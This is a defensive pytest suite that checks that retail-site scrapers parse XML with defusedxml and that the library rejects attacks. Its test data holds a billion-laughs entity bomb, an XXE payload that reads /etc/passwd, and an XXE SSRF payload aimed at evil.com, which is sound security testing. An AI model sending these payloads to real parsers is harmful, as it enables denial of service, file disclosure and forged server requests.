"""
Security tests for XML parsing using defusedxml.

Tests verify that all XML-parsing scrapers use defusedxml instead of
the vulnerable stdlib xml.etree.ElementTree.
"""

import importlib
import inspect
import pytest
from defusedxml.common import DTDForbidden, EntitiesForbidden, ExternalReferenceForbidden


SCRAPER_MODULES = ["att", "tmobile", "walmart", "bell", "samsclub"]


@pytest.mark.parametrize("scraper_name", SCRAPER_MODULES)
def test_scraper_uses_defusedxml(scraper_name: str):
    """Verify scraper imports defusedxml.ElementTree, not xml.etree.ElementTree."""
    # Dynamically import the scraper module
    scraper_module = importlib.import_module(f"src.scrapers.{scraper_name}")

    # Check the source code for the import
    source = inspect.getsource(scraper_module)

    # Should NOT have unsafe import
    assert "import xml.etree.ElementTree" not in source, \
        f"{scraper_name}.py still uses unsafe xml.etree.ElementTree"

    # Should have safe import
    assert "import defusedxml.ElementTree" in source, \
        f"{scraper_name}.py does not import defusedxml.ElementTree"


def test_defusedxml_blocks_billion_laughs():
    """
    Verify that defusedxml blocks billion laughs (entity expansion bomb) attack.

    The billion laughs attack uses nested entity expansion to cause
    exponential memory consumption and DoS.
    """
    import defusedxml.ElementTree as ET

    # Billion laughs payload - exponential entity expansion
    malicious_xml = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""

    # defusedxml should block this
    with pytest.raises((DTDForbidden, EntitiesForbidden)):
        ET.fromstring(malicious_xml)


def test_defusedxml_blocks_xxe_file_read():
    """
    Verify that defusedxml blocks XXE (XML External Entity) file read attack.

    XXE attacks can read arbitrary files from the server filesystem.
    """
    import defusedxml.ElementTree as ET

    # XXE payload attempting to read /etc/passwd
    malicious_xml = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

    # defusedxml should block this
    with pytest.raises((EntitiesForbidden, ExternalReferenceForbidden)):
        ET.fromstring(malicious_xml)


def test_defusedxml_blocks_xxe_ssrf():
    """
    Verify that defusedxml blocks XXE SSRF (Server-Side Request Forgery) attack.

    XXE attacks can make HTTP requests to internal/external services.
    """
    import defusedxml.ElementTree as ET

    # XXE payload attempting to make HTTP request
    malicious_xml = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/malicious">
]>
<root>&xxe;</root>"""

    # defusedxml should block this
    with pytest.raises((EntitiesForbidden, ExternalReferenceForbidden)):
        ET.fromstring(malicious_xml)


def test_defusedxml_allows_valid_sitemap():
    """
    Verify that defusedxml allows legitimate sitemap XML to parse correctly.

    Security hardening should not break normal functionality.
    """
    import defusedxml.ElementTree as ET

    # Valid sitemap XML (simplified)
    valid_xml = b"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://example.com/store/123</loc>
    <lastmod>2026-01-01</lastmod>
    <priority>0.8</priority>
  </url>
  <url>
    <loc>https://example.com/store/456</loc>
    <lastmod>2026-01-02</lastmod>
    <priority>0.8</priority>
  </url>
</urlset>"""

    # Should parse successfully
    root = ET.fromstring(valid_xml)

    # Verify we can access elements
    assert root.tag.endswith("urlset")

    # Find all URL elements
    namespace = {"ns": "http://www.sitemaps.org/schemas/sitemap/0.9"}
    urls = root.findall(".//ns:url", namespace)
    assert len(urls) == 2

    # Verify we can read loc elements
    locs = [url.find("ns:loc", namespace).text for url in urls]
    assert "https://example.com/store/123" in locs
    assert "https://example.com/store/456" in locs
